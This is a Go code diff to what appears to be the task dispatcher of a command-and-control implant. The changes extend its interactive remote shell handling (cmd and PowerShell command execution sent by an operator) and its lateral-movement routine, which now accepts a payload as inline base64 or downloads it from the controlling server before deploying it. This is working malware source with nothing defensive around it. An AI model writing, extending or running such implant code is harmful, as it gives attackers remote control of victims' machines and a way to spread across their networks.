@@ -1112,6 +1112,16 @@ func dispatchTask(t transport, task taskWire) {
 
 	case "ISHELL_OPEN":
 		shell := strings.ToLower(strings.TrimSpace(task.Args))
+		// The web UI sends {"shell":"cmd|ps"}; older clients sent the
+		// shell name directly. Accept both wire formats.
+		if strings.HasPrefix(shell, "{") {
+			var openArgs struct {
+				Shell string `json:"shell"`
+			}
+			if err := json.Unmarshal([]byte(task.Args), &openArgs); err == nil && openArgs.Shell != "" {
+				shell = strings.ToLower(strings.TrimSpace(openArgs.Shell))
+			}
+		}
 		if err := ishellOpen(shell); err != nil {
 			t.sendResult(task.ID, "", err.Error())
 			return
@@ -1119,7 +1129,18 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, "[+] interactive shell active", "")
 
 	case "ISHELL_RUN":
-		out, err := ishellRun(task.Args)
+		cmdLine := task.Args
+		// Keep accepting the former {"cmd":"..."} envelope as well as
+		// the current raw command text (which also permits PowerShell blocks).
+		if strings.HasPrefix(strings.TrimSpace(cmdLine), "{") {
+			var runArgs struct {
+				Cmd string `json:"cmd"`
+			}
+			if err := json.Unmarshal([]byte(cmdLine), &runArgs); err == nil && runArgs.Cmd != "" {
+				cmdLine = runArgs.Cmd
+			}
+		}
+		out, err := ishellRun(cmdLine)
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
@@ -1571,9 +1592,21 @@ func dispatchTask(t transport, task taskWire) {
 		var payloadBytes []byte
 		if existingPath == "" {
 			var err error
-			payloadBytes, err = t.downloadFile(la.Payload)
-			if err != nil {
-				t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
+			if task.Payload != "" {
+				payloadBytes, err = base64.StdEncoding.DecodeString(task.Payload)
+				if err != nil {
+					t.sendResult(task.ID, "", "LATERAL: decode inline payload: "+err.Error())
+					return
+				}
+			} else {
+				payloadBytes, err = t.downloadFile(la.Payload)
+				if err != nil {
+					t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
+					return
+				}
+			}
+			if len(payloadBytes) == 0 {
+				t.sendResult(task.ID, "", "LATERAL: empty payload")
 				return
 			}
 		}
